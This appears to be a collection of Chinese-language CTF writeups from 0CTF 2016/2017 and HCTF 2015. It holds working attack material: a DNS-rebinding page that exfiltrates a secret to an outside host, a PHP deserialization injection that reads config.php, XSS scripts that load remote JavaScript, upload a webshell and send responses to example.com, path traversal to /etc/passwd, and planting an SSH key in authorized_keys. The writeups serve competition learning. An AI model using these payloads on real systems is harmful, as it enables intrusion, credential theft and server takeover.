<!--
LICENSE UPL
Author: Mauro Risonho de Paula Assumpção
Data Create: 2026-03-16
Data Update: 2026-03-16
-->

---
name: writeup-garzon
description: CTF writeups and security challenges by garzon.
---

# Writeups by garzon

Source repository: `/repos/garzon`

## Repository Index

- CTF-Writeups/eth_writeup_ethernaut.zeppelin.solutions.md
- CTF-Writeups/0CTF2016/README.md
- CTF-Writeups/0CTF2017/README.md
- CTF-Writeups/GoogleCTF2016/README.md
- CTF-Writeups/HCTF2015/README.md
- CTF-Writeups/QWB2019/README.md
- CTF-Writeups/QiangwangCup/README.md
- CTF-Writeups/RCTF2015/README.md
- CTF-Writeups/RCTF2019/README.md
- CTF-Writeups/XDCTF2015/README.md
- CTF-Writeups/XNUCA201607WEB/README.md
- CTF-Writeups/问鼎杯2016/README.md

## Writeup Content


### File: CTF-Writeups/0CTF2016/README.md

# 0ctf 2016 Writeup

## monkey 4pts

上来就是一个PoW(proof of work)，如下解之：
```python
def solve(st):
    i = 0
    while True:
        s = hex(i)
        i += 1
        if hashlib.md5(s).hexdigest()[:6] == st:
            return s
```

由于monkey会在页面停留120s, 那么我们让他访问我们的'http://mydomain:8080/evil.html'后，页面里弄一个setTimeout，90s后ajax get一下'http://127.0.0.1:8080/secret'，在把这flag post到我们的主机上即可。所谓同源策略的话，在一开始把mydomain的A记录指向我们的服务器，ttl设为60s，在monkey访问页面mydomain:8080/evil.html后，马上把A记录改成127.0.0.1，90s后请求mydomain:8080/secret时就是请求127.0.0.1:8080/secret了。

evil.html如下：
```html
<!DOCTYPE html>
<html>
<head>
<script src="/jquery-1.10.2.js"></script>
<script>
function runTest() {
  setTimeout(function() {
        $.get('/secret', function(txt) {        
                $.post('http://somewhereelse/record',{data: txt},function(t){}, 'text');
        }, 'text');
  }, 90000);
}
</script>
</head>
<body onload="runTest()">
</body>
</html>
```

记得receive的时候，在somewhereelse/record发送头：`access-control-allow-origin: *`才能接收到flag`array ('data' => '0ctf{monkey_likes_banananananananaaaa}',)`

## opm 3pts
stegsolve按行提取rgb LSB得到zip，解压发现是一个arm的二进制代码段dump，转成二进制形式扔ida里，在0xaa109cc4处create function，F5得到这样的东西：

![create_function](opm_function.png)
猜测v6-34是flag字符串，长为16。

然后函数结尾处有个check，
![equation](opm_equation.png)

每个被检查的变量都是flag字符串的线性组合，如图：
![coeff](opm_coeff.png)

那么提取系数，解16元线性方程组，得到flag:
```python
>>> import numpy
>>> a=numpy.array([[-32, 97, 46, 45, 67, 79, -73, -13, -5, 27, -83, -100, -26, -55, 32, -55], [-31, -90, 20, -66, -89, -64, -73, 26, 87, -76, 15, 72, 85, 89, 6, 84], [78, 22, 94, 75, 34, 31, 61, -16, 100, 14, 27, 92, -42, -7, 83, 57], [43, 44, 75, -59, -17, 82, -1, -44, 47, -68, 76, 72, 48, -89, 96, -27], [44, -60, 87, -64, 57, -18, -60, 9, -81, -33, 24, 84, 62, 89, 42, -97], [30, 68, 23, 91, 46, 32, -62, 42, -5, 54, -57, 59, 48, -97, 89, 79], [-29, -14, 14, -89, -60, 11, 49, -79, 75, -86, -99, -57, -10, 9, 62, -97], [58, 58, 17, 91, -98, -75, -5, -60, -26, 83, -81, 80, 97, 6, 31, -69], [-21, -11, 62, -77, 84, -86, 49, -66, -1, 26, -4, -27, -43, -1, 19, 73], [83, 43, 77, 96, 83, -20, 26, -7, -89, -60, -23, 68, -51, -75, 42, 35], [74, 58, 73, -86, -100, 71, 12, 66, 69, 50, 48, 58, -52, 14, 45, -91], [-60, -61, 26, -31, 20, -59, -53, 72, 68, -90, -41, -74, 48, -27, 30, 8], [-26, 19, 31, -16, -95, 33, 64, -83, 10, 98, -35, -76, 7, -12, 25, -34], [-89, 61, -40, -67, 20, 42, 27, -37, 38, -16, 71, 16, 75, 4, 51, -6], [32, 57, -92, -47, 40, -54, -21, -25, -14, 91, 64, 39, 7, 38, 96, 82], [-56, -6, 55, 42, -6, -38, -37, -27, 64, 16, -54, -53, -96, -31, 84, 100]])
>>> y=numpy.array([-7026,-2645,53442,20609,8630,27564,-27078,15265,-12183,17452,31435,-23099,-8136,13019,20430,-12714])
>>> import numpy.linalg
>>> x=numpy.linalg.solve(a,y)
>>> x
array([  84.,  114.,   52.,   99.,   49.,   78.,  103.,   95.,   70.,
         48.,   82.,   95.,   70.,  117.,   78.,   33.])
>>> ''.join([chr(int(round(i))) for i in x])
'Tr4c1Ng_F0R_FuN!'
```

## piapiapia 6pts
这道题的漏洞是在于：
1. `$profile['nickname']`可以填数组，绕过检测。
2. 更新profile时，序列化后的`$profile`经过filter()过滤后，`'where'`或会变为`'hacker'`，也就是`s:5:"where";`会变成了`s:5:"hacker";`，导致长度不一样，序列化后的格式被破坏，导致反序列化失败。但我们可以精心调整where的个数和双引号的位置，就可以注入任意键值对到反序列化后的`$profile`里，而反序列化后，原代码会读取`$profile['photo']`路径的文件，返回给我们。考虑通过精心调整nickname，把`$profile['photo']`改成`'/var/www/html/config.php'`(经测试发现'../config.php'无效...)。利用以下代码生成payload和模拟这个过程:

```php
<?php

$profile['phone'] = '1';
$profile['email'] = '1';
$filename = '/var/www/html/config.php';
$len = strlen($filename);
$profile['nickname'] = array('";}s:5:"photo";s:' . $len . ':"' . $filename . '";}');
//$profile['nickname'] = array('";}s:5:"photo";O:5:"mysql":0:{}}');
$len = strlen($profile['nickname'][0]);
for($i=0; $i<$len; $i++)
    $profile['nickname'][0] = 'where' . $profile['nickname'][0];
$profile['photo'] = 'upload/' . md5('111');

function filter($string) {
    $escape = array('\'', '\\\\');
    $escape = '/' . implode('|', $escape) . '/';
    $string = preg_replace($escape, '_', $string);

    $safe = array('select', 'insert', 'update', 'delete', 'where');
    $safe = '/' . implode('|', $safe) . '/i';
    return preg_replace($safe, 'hacker', $string);
}
    
var_dump($profile);
echo "<br />";
echo filter(serialize($profile));
echo "<br />";
var_dump(unserialize(filter(serialize($profile))));
```


输出
```
array(4) {
  ["phone"]=>
  string(1) "1"
  ["email"]=>
  string(1) "1"
  ["nickname"]=>
  array(1) {
    [0]=>
    string(288) "wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere";}s:5:"photo";s:24:"/var/www/html/config.php";}"
  }
  ["photo"]=>
  string(39) "upload/698d51a19d8a121ce581499d7b701668"
}
<br />a:4:{s:5:"phone";s:1:"1";s:5:"email";s:1:"1";s:8:"nickname";a:1:{i:0;s:288:"hackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhacker";}s:5:"photo";s:24:"/var/www/html/config.php";}";}s:5:"photo";s:39:"upload/698d51a19d8a121ce581499d7b701668";}<br />array(4) {
  ["phone"]=>
  string(1) "1"
  ["email"]=>
  string(1) "1"
  ["nickname"]=>
  array(1) {
    [0]=>
    string(288) "hackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhacker"
  }
  ["photo"]=>
  string(24) "/var/www/html/config.php"
}
```

可以看到最后`$profile["photo"]`被修改成了想要的值。base64解码返回值，得到：
```python
>>> print '''PD9waHAKCSRjb25maWdbJ2hvc3RuYW1lJ10gPSAnMTI3LjAuMC4xJzsKCSRjb25maWdbJ3VzZXJuYW1lJ10gPSAnMGN0Zic7CgkkY29uZmlnWydwYXNzd29yZCddID0gJ29oLW15LSoqKiotd2ViJzsKCSRjb25maWdbJ2RhdGFiYXNlJ10gPSAnMENURl9XRUInOwoJJGZsYWcgPSAnMGN0ZntmYTcxN2I0OTY0OWZiYjljMGRkMGQxNjYzNDY5YTg3MX0nOwo/Pgo='''.decode('base64')
<?php
        $config['hostname'] = '127.0.0.1';
        $config['username'] = '0ctf';
        $config['password'] = 'oh-my-****-web';
        $config['database'] = '0CTF_WEB';
        $flag = '0ctf{fa717b49649fbb9c0dd0d1663469a871}';
?>
```

payload：
```
POST /update.php HTTP/1.1
Host: 202.120.7.203:8888
Content-Length: 979
Cache-Control: max-age=0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Origin: http://202.120.7.203:8888
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/48.0.2564.116 Safari/537.36
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryJPbDrUHm4bYPsH4Q
Referer: http://202.120.7.203:8888/update.php
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.6,en;q=0.4
Cookie: PHPSESSID=qsfo7b17a6ajo5usvmkaqqi636

------WebKitFormBoundaryJPbDrUHm4bYPsH4Q
Content-Disposition: form-data; name="phone"

11111111111
------WebKitFormBoundaryJPbDrUHm4bYPsH4Q
Content-Disposition: form-data; name="email"

2@example.com
------WebKitFormBoundaryJPbDrUHm4bYPsH4Q
Content-Disposition: form-data; name="nickname[]"

wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere";}s:5:"photo";s:24:"/var/www/html/config.php";}
------WebKitFormBoundaryJPbDrUHm4bYPsH4Q
Content-Disposition: form-data; name="photo"; filename="2.gif"
Content-Type: application/octet-stream

111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111
------WebKitFormBoundaryJPbDrUHm4bYPsH4Q--
```

## xor painter 4pts
下下来一个一堆坐标的文件，一开始以为是每行是一条直线两个端点的坐标(x1, y1, x2, y2)，画出来然后直线的交叉点异或处理。后来画出来一个三角形区域，就知道了是(x1, x2, y1, y2)。在画出来一个正方形区域里一坨雪花，仔细想想后发现应该是每行表示一个矩形而不是直线，然后问题就变成了顶点上矩形覆盖数的奇偶性问题，用二维线段树去弄，复杂度才可以接受，就是poj2155原题。懒得写二维线段树就上网随便抄了段题解代码跑（oi的代码果然还是不可靠各种崩，换了n种版本终于不崩了），找了个大内存机器后强行开几G数组跑线段树，发现画出来一个似是而非的东西，中间一坨1像素的直线干扰，如下：

![错误的图](xor_wrong.png)

后来在开了脑洞，估计就是右下角坐标需要-1，也就是这矩形区域是左闭右开的，然后就画出对的图了，就是一张18000*18000的图里面有大概几个像素大小的字母散落在大图的各处....还需要后续处理一下...

二维线段树的c++代码，算法部分直接抄自网上某角落的题解：
```cpp

#define SIZE (18000)
#define maxn (72010)
#define DIR "./"

#define LINE_NUM (13663881)
#include <iostream>
#include <stdio.h>
#include <string.h>

using namespace std;
bool *tree[maxn];
int n;
bool sum;

/*
更新子线段树，tl、tr对应子矩阵的y1、y2，即要更新的范围。
rtx：母线段树(x轴)的节点，表示该子线段树属于母线段树的节点rtx
rt：子线段树的节点序号
L,R为子线段树节点rt的两端点
*/
void updatey(int rtx, int rt, int tl, int tr, int L, int R) {
	//一开始弄反了，写成L<=tl && tr<=R。。。
	//要注意，应该是所在节点rt的区间在所要更新的节点范围里，更新节点rt的区间对应的值
	if (tl <= L && R <= tr) {
		tree[rtx][rt] = !tree[rtx][rt];  //对属于更新范围里的子矩阵进行取反
		return;
	}
	int mid = (L + R) >> 1;
	//下面部分也可以换成注释掉的语句
	if (tl <= mid)
		updatey(rtx, rt << 1, tl, tr, L, mid);
	if (tr>mid)
		updatey(rtx, rt << 1 | 1, tl, tr, mid + 1, R);
	/*
	if(tr<=mid)
	updatey(rtx,rt<<1,tl,tr,L,mid);
	else if(tl>mid)
	updatey(rtx,rt<<1|1,tl,tr,mid+1,R);
	else{
	updatey(rtx,rt<<1,tl,mid,L,mid);
	updatey(rtx,rt<<1|1,mid+1,tr,mid+1,R);
	}
	*/



}
/*
更新左上角(x1,y1)，右下角(xr,yr)的子矩阵区域
更新时，先在x轴找到对应[xl,xr]区间的点，再找按y轴找到对应[yl,yr]区间的节点
rt:母线段树的节点序号
L,R:rt节点的区间端点
*/
void updatex(int rt, int xl, int xr, int yl, int yr, int L, int R) {
	//一开始弄反了，写成L<=xl && xr<=R。。。
	if (xl <= L && R <= xr) {
		updatey(rt, 1, yl, yr, 0, n);
		return;
	}
	int mid = (L + R) >> 1;
	//下面部分也可以换成注释掉的语句
	if (xl <= mid)
		updatex(rt << 1, xl, xr, yl, yr, L, mid);
	if (xr>mid)
		updatex(rt << 1 | 1, xl, xr, yl, yr, mid + 1, R);
	/*
	if(xr<=mid)
	updatex(rt<<1,xl,xr,yl,yr,L,mid);
	else if(xl>mid)
	updatex(rt<<1|1,xl,xr,yl,yr,mid+1,R);
	else{
	updatex(rt<<1,xl,mid,yl,yr,L,mid);
	updatex(rt<<1|1,mid+1,xr,yl,yr,mid+1,R);
	}
	*/

}
/*
这里注意的是，是直到L!=R的时候，才停止查询，否则就要一直查询下去，直到查询到y所在的叶子节点
因为这里“异或”就相当于lazy标记，所以要获得最后的值，则必须遍历过y所在的所有子矩阵
rtx：母线段树(x轴)的节点，表示该子线段树属于母线段树的节点rtx
rt：子线段树的节点序号
L,R为子线段树节点rt的两端点
*/
void queryy(int rtx, int rt, int y, int L, int R) {
	sum ^= tree[rtx][rt];  //这里注意：要先异或！
	if (L != R) {
		int mid = (L + R) >> 1;
		if (y <= mid)
			queryy(rtx, rt << 1, y, L, mid);
		else
			queryy(rtx, rt << 1 | 1, y, mid + 1, R);
	}
}
/*
这里注意的是，是直到L!=R的时候，才停止查询，否则就要一直查询下去，直到查询到点x所在的叶子节点
因为这里“异或”就相当于lazy标记，所以要获得(x,y)最后的值，则必须遍历过(x,y)点所在的所有子矩阵
rt：母线段树的节点序号
L,R为子线段树节点rt的两端点
x,y为所要查找的点的值
*/
void queryx(int rt, int x, int y, int L, int R) {
	queryy(rt, 1, y, 0, n);
	//注意：当L<R的时候，还要继续往下查询，直到L=R=y。而不是到L<=Y<=R的时候就停止
	if (L != R) {
		int mid = (L + R) >> 1;
		if (x <= mid)
			queryx(rt << 1, x, y, L, mid);
		else
			queryx(rt << 1 | 1, x, y, mid + 1, R);
	}
}

int main() {
	
	for (int i = 0; i < maxn; i++) {
		tree[i] = new bool[maxn];
		memset(tree[i], 0, sizeof(bool[maxn]));
	}

	n = SIZE;

	FILE *f = fopen(DIR"xorlist", "r");
	int x1, y1, x2, y2;
	for (int i = 0; i < LINE_NUM; i++) {
		fscanf(f, "%d, %d, %d, %d", &x1, &x2, &y1, &y2);
		updatex(1, x1, x2-1, y1, y2-1, 0, n);
		if (i % 500000 == 0) 
			printf("%d\n", i);
	}
	fclose(f);

	f = fopen(DIR"xor.output", "w");
	for (int i = 0; i < SIZE; i++) {
		for (int j = 0; j < SIZE; j++) {
			sum = false;
			queryx(1, x1, y1, 0, n);
			fprintf(f, "%c", sum ? '1' : '0');
		}
		if(i%10==0) printf("%d\n", i);
		fprintf(f, "\n");
	}
	fclose(f);
	
	return 0;
}
```


用PIL把输出画成大图：
```python
from PIL import Image
def draw():
    size = 18000
    a=open('./xor.output','rb').read()
    a=a.replace('\r','').split('\n')
    b=Image.new('L',(size,size))
    for i in xrange(size):
        if i%100==0: print i
        for j in xrange(size):
            b.putpixel((j, i), 255 if a[i][j]=='1' else 0)
    b.resize((1000,1000)).save('./xor3.bmp')
    b.save('./xor_original3.png')
```

找字母用代码，把图片和对应坐标打出来：
```python
import Image
img = Image.open('./xor_original3.png')
counter = 0
x=0
while x<180:
    print x
    y=0
    while y<180:
        flag = 0
        for i in xrange(100):
            for j in xrange(100):
                if img.getpixel((y*100+j, x*100+i)) == 0:
                    flag += 1
                    if flag > 10: break
            if flag > 10: break
        if flag > 10:
            counter += 1
            img.crop((y*100, x*100, (y+1)*100-1, (x+1)*100-1)).save('xor/%d_%d_%d.png' % (counter, x, y))
        y+=1
    counter += 1
    img.crop((0, 0, 99, 99)).save('xor/%d.png' % counter)
    x+=1
```

画出来这样的一堆图：
![小字母](xor_segment.png)

人肉识别一下：
```
10_9_19.png 0
115_89_35.png B
117_90_35.png B
121_93_73.png i
124_95_89.png G
126_96_6.png _
127_96_7.png _
128_96_89.png G
12_10_18.png 0
134_101_127.png _
135_101_144.png B
13_10_19.png 0
152_117_125.png p
155_119_44.png t
163_126_14.png i
164_126_74.png m
165_126_89.png a
167_127_89.png a
16_12_46.png c
170_129_152.png }
17_12_92.png f
19_13_92.png f
22_15_66.png t
26_18_122.png {
27_18_149.png 5
50_40_19.png m
51_40_20.png m
53_41_19.png m
54_41_20.png m
55_41_118.png _
58_43_153.png f
61_45_72.png L
62_45_73.png L
64_46_44.png @
66_47_89.png L
84_64_70.png g
89_68_119.png #
93_71_36.png @
95_72_94.png _
96_72_144.png n 
98_73_13.png L
```

重新渲染一张图...
```python
>>> zip(b,c)
[((9, 19), '0'), ((89, 35), 'B'), ((90, 35), 'B'), ((93, 73), 'i'), ((95, 89), 'G'), ((96, 6), '_'), ((96, 7), '_'), ((96, 89), 'G'), ((10, 18), '0'), ((101, 127), '_'), ((101, 144), 'B'), ((10, 19), '0'), ((117, 125), 'p'), ((119, 44), 't'), ((126, 14), 'i'), ((126, 74), 'm'), ((126, 89), 'a'), ((127, 89), 'a'), ((12, 46), 'c'), ((129, 152), '}'), ((12, 92), 'f'), ((13, 92), 'f'), ((15, 66), 't'), ((18, 122), '{'), ((18, 149), '5'), ((40, 19), 'm'), ((40, 20), 'm'), ((41, 19), 'm'), ((41, 20), 'm'), ((41, 118), '_'), ((43, 153), 'f'), ((45, 72), 'L'), ((45, 73), 'L'), ((46, 44), '@'), ((47, 89), 'L'), ((64, 70), 'g'), ((68, 119), '#'), ((71, 36), '@'), ((72, 94), '_'), ((72, 144), 'n'), ((73, 13), 'L')]
>>> a=Image.new('L',(180,180))
>>> dr=ImageDraw.Draw(a)
>>> for i,j in zip(b,c):
...     dr.text(i, unicode(j,'UTF-8'), font=font, fill=255)
...
>>> a.show()
>>> a.save('flag.png')
```

得到flag:
![flag](xor_flag.bmp)



### File: CTF-Writeups/0CTF2017/README.md

## py

利用`marshal.loads`我们人肉扣出encrypt字节码，并根据常量发现了pip里有rotor模块，对着字节码进行了如下脑洞：
```
\x99\x01\x00    load consts   key_a="!@#$%^&*"
\x68\x01\x00    store

\x99\x02\x00    load  consts  key_b="abcdefgh"
\x68\x02\x00    store

\x99\x03\x00    load  consts  key_c="<>{}:""
\x68\x03\x00    store

\x61\x01\x00    load_f key_a
\x99\x04\x00    load consts 4
\x46 *          key_a * 4

\x99\x05\x00    load consts |
\x27 +          key_a * 4 + "|"

\x61\x02\x00    load_f key_b
\x61\x01\x00    load_f key_a
\x27 +

\x61\x03\x00    load_f key_c
\x27 +          key_b + key_a + key_c

\x99\x06\x00    load consts 2
\x46 *          (key_b + key_a + key_c) * 2
\x27 +          key_a * 4 + "|" + (key_b + key_a + key_c) * 2

\x99\x05\x00    load consts |
\x27 +          key_a * 4 + "|" + (key_b + key_a + key_c) * 2 + "|"

\x61\x02\x00    load_f key_b
\x99\x06\x00    load consts 2
\x46 *          key_b * 2
\x27 +          key_a * 4 + "|" + (key_b + key_a + key_c) * 2 + "|" + key_b * 2

\x99\x07\x00    load consts "EOF"
\x27 +          key_a * 4 + "|" + (key_b + key_a + key_c) * 2 + "|" + key_b * 2 + "EOF"

\x68\x04\x00    store secret = key_a * 4 + "|" + (key_b + key_a + key_c) * 2 + "|" + key_b * 2 + "EOF"
\x9b\x00\x00    IMPORT rotor
\x60\x01\x00    PUSH rotor.rotor

\x61\x04\x00    load_f secret
\x83\x01\x00    CALL # rotor.rotor(secret)

\x68\x05\x00    store rot = rotor.rotor(secret)
\x61\x05\x00    load_f rot
\x60\x02\x00    PUSH rot.encrypt

\x61\x00\x00    load_f data
\x83\x01\x00    CALL # rot.encrypt(data)

\x53            return
```

其实`\x27`很容易就猜出来是字符串拼接`+`，但是`\x46`我们一开始猜测是SLICE+1, SLICE+2 (即string[x:]和string[:x])折腾了好久，后来才脑洞出来字符串操作还有一个`*`....
于是就出来了，把secret扔进去rotor模块在decrypt一下就好。

## KoG

发现`Module.main`会对参数为纯数字的时候进行签名后，传给api.php，但有其他字符时不予签名。
仔细观察`functionn.js`，可以发现经过c++符号修饰的函数名，可以扔到`c++filt`里查看：
```
~$ c++filt _ZN5HASH16updateEPKhj
HASH1::update(unsigned char const*, unsigned int)
```
可知有个HASH1的类，仔细寻找代码里隐藏的常数可以知道是md5。


```javascript
function __ZN5HASH16updateEPKhj($this,$input,$length) {
 $this = $this|0;
 $input = $input|0;
 $length = $length|0;
```
然后在上面的`__ZN5HASH16updateEPKhj`update函数入口下断点，每次停下的时候在console里把`HEAP`里的`$input`指针指向的位置打出来看看，就知道传入了哪些字符串。一开始程序会传入"Start_here_"作为提示，但后来发现这个字符串是不需要的。事实上，把其他传进来的字符串拼接后，发现`functionn.js`做的就是return md5("d727d11f6d284a0d%s This_is_salt%s" % (payload, timestamp))，然后我们就可以自己对payload签名了，在payload中进行sql注入即可。


脚本如下：
```py
# __ZN5HASH16updateEPKhj
payload = sys.argv[1]
print payload
hash = hashlib.md5("d727d11f6d284a0d%s This_is_salt1489820887"%payload).hexdigest()
print requests.get('http://202.120.7.213:11181/api.php', params={'id':payload, 'hash':hash, 'time':'1489820887'}).text
```

## Complicated XSS

输入`admin.government.vip:8000`会跳转到`admin.government.vip:8000/login`进行登录，
登录后在`admin.government.vip:8000/`处，发现Cookie中的username字段会直接打到HTML页面上，这里可以进行二次XSS。
所以在原始payload中，要设置cookie如`username=<script src='http://example.com/xss.js'></script>;domain=.government.vip;path=/`来进行2次XSS，在`admin.government.vip:8000`下XSS就没有域限制。


原始payload脚本（第一次XSS）如下：
```py
def solve(cap):
    print 'cap: %s' % cap
    for i in xrange(1000000000):
        if hashlib.md5(str(i)).hexdigest()[:len(cap)] == cap:
            return str(i)

s = requests.session()
resp = s.get('http://government.vip/').text
resp = resp[resp.index(" === '")+len(" === '"):]
resp = resp[:6]
task = solve(resp)
data =  {"task": task, 'payload': '''
<script>
function createCookie(name,value,days) {
    if (days) {
        var date = new Date();
        date.setTime(date.getTime() + (days * 24 * 60 * 60 *1000));
        var expires = "; expires=" + date.toGMTString();
    }
    else {
        var expires = "";
    }
    document.cookie = name + "=" + value + expires + ";domain=.government.vip;path=/";
}
function eraseCookie(name) {
    createCookie(name,"",-1);
}
eraseCookie("username");
// remember to ENCODE and REPLACE "BASE64_ENCODE_HERE(.)" in the payload below, or the end of script tag in the payload string makes trouble
document.cookie=atob(BASE64_ENCODE_HERE('''username=<script src='http://example.com/xss.js'></script>;domain=.government.vip;path=/'''));
document.write('<iframe src="http://admin.government.vip:8000/" id="i"></iframe>');
</script>
''', 'submit':'submit'}
print s.post('http://government.vip/run.php', data=data, headers={'Content-Type':'application/x-www-form-urlencoded'}).text
```


`http://example.com/xss.js`要做的事情如下：
1. 恢复cookie中的username为admin
2. 因为`admin.government.vip:8000/`中`delete XMLHttpRequest`，我们可以从`<iframe src='/login' id='iij'></iframe>`中的contentWindow中把XMLHttpRequest恢复出来。
3. 使用恢复后的XMLHttpRequest，用恢复后的Cookie: username=admin把`<iframe src='/' id='ii'></iframe>`的页面内容回传。


回传后，发现admin的`admin.government.vip:8000/`页面不是flag而是一个让你上传webshell的表单，那么接下来我们只需要把第三步改成：
3. 使用恢复后的XMLHttpRequest，用恢复后的Cookie: username=admin，往`/upload`POST一个webshell文件（其实什么内容都可以），把response回传。


`http://example.com/xss.js`如下：
```javascript
//'username=admin;domain=.government.vip;path=/'
document.cookie=atob('dXNlcm5hbWU9YWRtaW47ZG9tYWluPS5nb3Zlcm5tZW50LnZpcDtwYXRoPS8=');
document.write("<iframe src='/login' id='iij'></iframe><iframe src='/' id='ii'></iframe>");

function send2(x, p) {
    var xhr = new XMLHttpRequest();
    xhr.onreadystatechange = function() {
    };
    xhr.open('POST', 'http://example.com/record.php?'+p+'='+btoa(x), true);
    xhr.send(null);
}

setTimeout(function(){
    var arr = ["Function","eval","alert","XMLHttpRequest","Proxy","Image","postMessage"];
    for(var i in arr) {
        i = arr[i];
        window[i] = document.getElementById('iij').contentWindow[i];
    }

    function send(url, data) {
        var xhr = new XMLHttpRequest();
        xhr.open("POST", url, true);
        xhr.onreadystatechange = function () {
            if (xhr.readyState == 4)
                send2(xhr.responseText, 'resp');
        };
        var d = new FormData();
        d.append('file', new Blob([data]), 'agrnhte.php');
        xhr.send(d);
    }
    
    send("http://admin.government.vip:8000/upload", 'aaa');
}, 1000);

```


其实过程中遇到了玄学问题，比如它回传个400 BAD REQUEST什么就不谈了...


## simpleXSS

XSS payload只允许使用大小写字母数字加上`<^*~\-|_=+`这些特殊符号，那么大概只有两种方案：
1. 利用onload=A=B 可以作一句给A(通常是location)赋值B的简单js赋值操作
2. 利用某些奇怪的HTML标签特性


比赛时感觉方向1行不通，于是我走了方向2的思路。但方向1还真让某`LC↯BC`队https://ctftime.org/writeup/5956 脑洞出来了个奇葩思路，只能佩服下RMB玩家...不对，应该是$12.95 Dollar玩家orz


我们（nao）想（dong）出来的payload有如下几个关键点：
1. Chrome会把域名中的`。`（全角句号）理解成`.`
2. `<link rel=import`这种标签会把html import到当前页面里....N年前玩polymer的时候常用的一种标签...这里不能用script标签，因为script标签没有正常闭合时引用的js貌似不会被执行
3. `\\`会被Chrome理解成`//`，`\`也会理解成`/` （其实这里有个小插曲，我Win10上的Chrome会把`\\`理解成windows资源管理器里敲的那种`\\`也就是samba协议(或`file://`伪协议)...所以这种payload XSS Windows貌似是不行...?）， 因此`\\example。com\xssHtml`会变成`//example.com/xssHtml`


综上，payload:
```html
<link rel=import href=\\example。com\xssHtml other= 
```


### File: CTF-Writeups/GoogleCTF2016/README.md

# GoogleCTF 2016

懒得写writeup了，随便扔点payload



### File: CTF-Writeups/HCTF2015/README.md

# HCTF 2015

## 2. fuck === 75
```php
if (isset($_GET['a']) and isset($_GET['b'])) {
    if ($_GET['a'] != $_GET['b'])
    	if (md5($_GET['a']) === md5($_GET['b']))
        	die('Flag: '.$flag);
    else
        print 'Wrong.';
```

扔两个数组过去即可
`/index.php?a[]=asd&b[]=rew`

## 3. black eat black 300

使用该DNS(180.153.47.182)后会劫持到120.55.181.136,     
由`黑吃黑`可知，他会根据host字段来帮你代理http请求，    
那么把host改成127.0.0.1就能吃掉他了，nmap扫描后发现开了一堆filtered端口，    
把host改成127.0.0.1:4444后发向120.55.181.136，就能看到一个叫gayhub的网站，     
注册并登陆后，发现能上传覆盖任意文件（有写权限的话），文件名带`../`可以上传至上一级目录，      
上传文件的路径形如`/:username/uploadfile/:filename`，（而且我试出来真实路径是`/static/upload/:username/:filename`，不过没什么卵用）    
发现上传到上一级的目录的文件不能通过`/:username/uploadfile/../:filename`来访问，经测试后发现会把`../`扔掉，     
那么可以构造`....//`，替换后变成`../`来绕过      
于是读`/:username/uploadfile/....//....//....//....//....//....//....//etc/passwd`，发现有类似`hctf2015:/home/hctf2015:/usr/bin/whereisflag`的字段，而且无法读取`/usr/bin/whereisflag`，     
那么利用上传系统，上传自己的公钥到`../../../../../../home/hctf2015/.ssh/authorized_keys`，ssh上去回答几道问题就能拿到flag啦


## 7. server is done 175

构造一个足够长的字符串arg = '0'*512 (>512 bytes)，看他返回的message，就能发现大于512时有循环部分，html注释部分里的加密后的flag也是512字节，      
仔细检查后发现，`encrypted flag = arg xor message xor flag`，于是异或一下得到flag


## 8. fuckphp 300

看小说页里面最下面有个`<!--download.php?file=SAO.7z-->`，下载出来就是小说包....      
开下脑洞试了几个发现能下载个`backup.zip`...     
打开看了下是一个叫`flagflagflaggogogo.php`的OPCODE DUMP文件，    
仔细阅读后发现需要读取`$_GET['username'], $_GET['password']` 长均为16，且异或后等于`'ILoveAklisheheha'`      
随便构造了个`/flagflagflaggogogo.php?username=y6*,%3C$*-(2)$)$)Q&password=0zEZYeAAAAAAAAA0`就过去了
然后有个是加密flag的函数：
```
compiled vars:  !0 = $target1, !1 = $target2, !2 = $getFlag, !3 = $echoFlag, !4 = $getUserInfo, !5 = $checkTarget1, !6 = $flag, !7 = $cbc_key, !8 = $cbc_iv
   8     0  E >   FETCH_R                      static              $0      'flag'
         1        ASSIGN                                                   !0, $0
         2        FETCH_R                      static              $2      'cbc_key'
         3        ASSIGN                                                   !1, $2
         4        FETCH_R                      static              $4      'cbc_iv'
         5        ASSIGN                                                   !2, $4
   9     6        FETCH_CONSTANT                                   ~6      'MCRYPT_BLOWFISH'
         7        SEND_VAL                                                 ~6
         8        SEND_VAR                                                 !1
         9        SEND_VAR                                                 !0
        10        FETCH_CONSTANT                                   ~7      'MCRYPT_MODE_CBC'
        11        SEND_VAL                                                 ~7
        12        SEND_VAR                                                 !2
        13        DO_FCALL                                      5  $8      'mcrypt_encrypt'
        14        SEND_VAR_NO_REF                               6          $8
        15        DO_FCALL                                      1  $9      'base64_encode'
        16      > RETURN                                                   $9
  10    17*     > RETURN                                                   null
```

加密完后，会依次输出`$encFlag, $cbc_iv, $cbc_key`，
显示出来的是`HFcN8aBMiUUvprvYK2vF9teFBwZvsLag5pivWzxOu+JPTg3FFBonyg==longjingmolihua!`

那么写段php：
```php
echo mcrypt_decrypt(MCRYPT_BLOWFISH, 'molihua!', base64_decode('HFcN8aBMiUUvprvYK2vF9teFBwZvsLag5pivWzxOu+JPTg3FFBonyg=='), MCRYPT_MODE_CBC, 'longjing');
```
即可输出flag

